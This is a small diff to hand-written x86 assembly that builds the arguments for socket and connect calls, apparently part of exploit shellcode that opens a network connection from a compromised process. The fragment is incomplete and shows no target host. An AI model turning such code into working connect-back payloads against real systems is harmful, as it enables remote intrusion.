@@ -1,4 +1,5 @@
 #call _socket
+SUB ESP, 512
 PUSH 0x0 # protocol
 PUSH 0x1 # type
 PUSH 0x2 # family = AF_INET
@@ -22,7 +23,7 @@ MOV EDI, ESP #struct sockaddr* pointer to the struct
 
 
 #call _connect
-PUSH 0x10 # sizeof(serv_addr)
+PUSH 16 # sizeof(serv_addr)
 PUSH EDI #struct sockaddr*
 PUSH ESI #  sockfd
 MOV EDI, 0x08048750
